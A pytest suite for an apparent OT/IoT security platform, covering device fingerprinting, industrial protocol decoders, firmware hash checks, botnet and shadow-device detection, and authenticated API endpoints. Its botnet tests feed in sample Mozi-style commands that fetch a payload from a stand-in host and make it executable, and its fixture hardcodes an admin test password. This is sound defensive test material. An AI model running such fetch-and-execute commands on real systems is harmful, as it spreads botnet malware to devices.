import pytest
from fastapi.testclient import TestClient
from main import (
    app, Base, engine, SessionLocal,
    IoTDeviceModel, IoTIncidentModel, FirmwareVulnModel
)
from backend.ot_iot.asset_discovery import IoTAssetDiscovery
from backend.ot_iot.device_fingerprint import DeviceFingerprint
from backend.ot_iot.mac_vendor_lookup import MacVendorLookup
from backend.ot_iot.topology_mapper import IoTTopologyMapper
from backend.ot_iot.device_classifier import DeviceClassifier
from backend.ot_iot.firmware_identifier import FirmwareIdentifier
from backend.ot_iot.firmware_scanner import FirmwareScanner
from backend.ot_iot.firmware_hash_db import FirmwareHashDB

from backend.ot_iot.coap_decoder import CoAPDecoder
from backend.ot_iot.zigbee_decoder import ZigbeeDecoder
from backend.ot_iot.bluetooth_decoder import BLEDecoder
from backend.ot_iot.snmp_decoder import SNMPDecoder
from backend.ot_iot.mqtt_decoder import MQTTDecoder
from backend.ics.opcua_decoder import OPCUADecoder
from backend.ics.s7comm_decoder import S7CommDecoder
from backend.ics.iec104_decoder import IEC104Decoder

from backend.ot_iot.iot_behavior_analyzer import IoTBehaviorAnalyzer
from backend.ot_iot.botnet_detector import BotnetDetector
from backend.ot_iot.mirai_detector import MiraiDetector
from backend.ot_iot.iot_threat_hunter import IoTThreatHunter
from backend.ot_iot.iot_ml_detector import IoTMLDetector
from backend.ot_iot.iot_response_engine import IoTResponseEngine
from backend.ot_iot.iot_knowledge_graph import IoTKnowledgeGraph
from backend.ot_iot.digital_twin import DigitalTwin
from backend.ot_iot.scenario_runner import OTIoTScenarioRunner
from backend.ot_iot.attack_emulator import OTIoTAttackEmulator
from backend.ot_iot.shadow_iot_detector import ShadowIoTDetector
from backend.ot_iot.risk_engine import IoTRiskEngine
from backend.ot_iot.ics_attack_mapper import ICSAttackMapper
from backend.ot_iot.iot_cve_mapper import IoTCVEMapper
from backend.ot_iot.vendor_feed import VendorFeedAggregator
from backend.ot_iot.iot_forensics import IoTForensics


@pytest.fixture(scope="module")
def client_auth():
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()
    try:
        # Clear tables
        db.query(IoTDeviceModel).delete()
        db.query(IoTIncidentModel).delete()
        db.query(FirmwareVulnModel).delete()
        db.commit()
    finally:
        db.close()
        
    with TestClient(app) as client:
        # Authenticate
        login_res = client.post("/api/v1/auth/login", json={"email": "admin@niravan.ai", "password": "admin123"})
        assert login_res.status_code == 200
        token = login_res.json()["token"]
        headers = {"Authorization": f"Bearer {token}"}
        yield client, headers


def test_mac_vendor_lookup():
    # Test valid OUI prefix
    res = MacVendorLookup.lookup("00:40:48:11:22:33")
    assert res["found"] is True
    assert res["vendor"] == "Hikvision"
    assert res["risk_category"] == "iot_critical"
    
    # Test invalid OUI prefix
    res = MacVendorLookup.lookup("FF:FF:FF:11:22:33")
    assert res["found"] is False
    assert res["vendor"] == "Unknown"
    
    # Test helper checkers
    assert MacVendorLookup.is_ot_device("00:0E:8C:11:22:33") is True
    assert MacVendorLookup.is_iot_camera("00:40:48:11:22:33") is True


def test_device_classifier():
    classifier = DeviceClassifier()
    info = {"vendor": "Siemens", "model": "S7-1200", "protocols": ["S7Comm"]}
    classification = classifier.classify(info)
    assert classification["device_type"] == "PLC"
    assert classification["category"] == "OT_Critical"
    assert classification["risk_tier"] == 1
    assert "T0855" in classification["mitre_context"]
    
    # Recommended protocols
    protos = classifier.get_recommended_protocols("CCTV_Camera")
    assert "SRTSP" in protos


def test_firmware_integrity_scanner():
    hash_db = FirmwareHashDB()
    # Test adding clean hash
    h = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
    hash_db.add_hash(h, {"vendor": "Cisco", "model": "Catalyst"}, is_malicious=False)
    res = hash_db.check_hash(h)
    assert res["status"] == "clean"
    
    # Test adding malicious hash
    h_mal = "f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2"
    hash_db.add_hash(h_mal, {"vendor": "Dahua", "threat": "Mirai"}, is_malicious=True)
    res_mal = hash_db.check_hash(h_mal)
    assert res_mal["status"] == "malicious"


def test_protocol_decoders():
    # Test MQTT
    mqtt_res = MQTTDecoder.decode_packet("102d00044d5154540402003c000a636c69656e742d6d717474")
    assert mqtt_res["valid"] is True
    
    # Test CoAP
    coap_res = CoAPDecoder.decode_packet("40010001")
    assert coap_res["valid"] is True
    
    # Test Zigbee
    zigbee_res = ZigbeeDecoder.decode_frame("010812345678abcd")
    assert zigbee_res["valid"] is True
    
    # Test BLE
    ble_res = BLEDecoder.decode_packet("0206aabbccddeeff")
    assert ble_res["valid"] is True
    
    # Test SNMP
    snmp_res = SNMPDecoder.decode_packet("302c02010104067075626c6963")
    assert snmp_res["valid"] is True
    
    # Test OPCUA
    opcua_res = OPCUADecoder.decode_packet("4d53474600000020")
    assert opcua_res["valid"] is True
    
    # Test S7Comm
    s7_res = S7CommDecoder.decode_packet("0300001611e0000000010080")
    assert s7_res["valid"] is True
    
    # Test IEC104
    iec_res = IEC104Decoder.decode_packet("680407000000")
    assert iec_res["valid"] is True


def test_botnet_detector():
    botnet = BotnetDetector()
    res = botnet.detect("10.0.0.5", {
        "ports": [7547],
        "payloads": ["d1:ad2:id20:mozi.m"]
    }, ["wget http://1.2.3.4/mozi.a", "chmod 777 mozi"])
    assert res["threat_detected"] == "Mozi"
    assert res["severity"] == "CRITICAL"


def test_digital_twin_and_emulator():
    twin = DigitalTwin()
    assert len(twin.get_all_environments()) == 7
    
    inv = twin.get_device_inventory("Hospital")
    assert len(inv) > 0
    
    risk = twin.assess_risk("Hospital")
    assert risk["risk_level"] in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
    
    emulator = OTIoTAttackEmulator()
    res = emulator.emulate("CCTV Botnet", "Hospital")
    assert res["status"] == "COMPLETED"
    assert res["scenario_name"] == "CCTV Botnet"
    assert res["citizen_impact_score"] > 0


def test_shadow_iot_detector():
    detector = ShadowIoTDetector()
    discovery = {
        "devices": [
            {"id": "dev1", "mac": "B8:27:EB:11:22:33", "hostname": "unauthorized-pi", "device_type": "Raspberry_Pi", "is_on_asset_register": False},
            {"id": "dev2", "mac": "00:0A:B0:44:55:66", "hostname": "cisco-router", "device_type": "Router", "is_on_asset_register": True}
        ]
    }
    res = detector.scan_for_shadow_devices(discovery, [])
    assert res["total_shadow_detected"] == 1
    assert res["shadow_devices"][0]["id"] == "dev1"


def test_api_integration(client_auth):
    client, headers = client_auth
    
    # 1. POST /api/v1/ot-iot/discover
    res = client.post("/api/v1/ot-iot/discover", json={"subnet": "192.168.10.0/24"}, headers=headers)
    assert res.status_code == 200
    data = res.json()
    assert "devices" in data
    assert len(data["devices"]) > 0
    device_id = data["devices"][0]["id"]
    
    # 2. GET /api/v1/ot-iot/devices
    res = client.get("/api/v1/ot-iot/devices", headers=headers)
    assert res.status_code == 200
    assert len(res.json()) > 0
    
    # 3. GET /api/v1/ot-iot/devices/{device_id}
    res = client.get(f"/api/v1/ot-iot/devices/{device_id}", headers=headers)
    assert res.status_code == 200
    assert "fingerprint" in res.json()
    
    # 4. POST /api/v1/ot-iot/firmware/scan
    res = client.post("/api/v1/ot-iot/firmware/scan", json={"device_id": device_id}, headers=headers)
    assert res.status_code == 200
    assert "cves" in res.json()
    
    # 5. POST /api/v1/ot-iot/protocol/decode
    res = client.post("/api/v1/ot-iot/protocol/decode", json={"protocol": "mqtt", "raw_hex": "102d00044d5154540402003c000a636c69656e742d6d717474"}, headers=headers)
    assert res.status_code == 200
    assert res.json()["valid"] is True
    
    # 6. POST /api/v1/ot-iot/behavior/analyze
    res = client.post("/api/v1/ot-iot/behavior/analyze", json={"device_id": device_id}, headers=headers)
    assert res.status_code == 200
    assert "anomaly_score" in res.json()
    
    # 7. POST /api/v1/ot-iot/botnet/detect
    res = client.post("/api/v1/ot-iot/botnet/detect", json={
        "device_id": device_id,
        "traffic": {"ports": [7547], "payloads": ["d1:ad2:id20:mozi.m"]},
        "cmd_history": ["wget http://1.2.3.4/mozi.a", "chmod 777 mozi"]
    }, headers=headers)
    assert res.status_code == 200
    assert "threat_detected" in res.json()
    
    # 8. POST /api/v1/ot-iot/ml/detect
    res = client.post("/api/v1/ot-iot/ml/detect", json={"device_id": device_id}, headers=headers)
    assert res.status_code == 200
    assert "ensemble_verdict" in res.json()
    
    # 9. POST /api/v1/ot-iot/response/contain
    res = client.post("/api/v1/ot-iot/response/contain", json={"device_id": device_id, "threat_type": "botnet"}, headers=headers)
    assert res.status_code == 200
    assert "status" in res.json()
    
    # 10. POST /api/v1/ot-iot/digital-twin/scenario
    res = client.post("/api/v1/ot-iot/digital-twin/scenario", json={"scenario_name": "CCTV Botnet", "environment": "Hospital"}, headers=headers)
    assert res.status_code == 200
    assert res.json()["status"] == "SUCCESS"
    
    # 11. GET /api/v1/ot-iot/knowledge-graph
    res = client.get("/api/v1/ot-iot/knowledge-graph", headers=headers)
    assert res.status_code == 200
    assert "nodes" in res.json()
    
    # 12. POST /api/v1/ot-iot/forensics/collect
    res = client.post("/api/v1/ot-iot/forensics/collect", json={"device_id": device_id}, headers=headers)
    assert res.status_code == 200
    assert "chain_of_custody" in res.json()
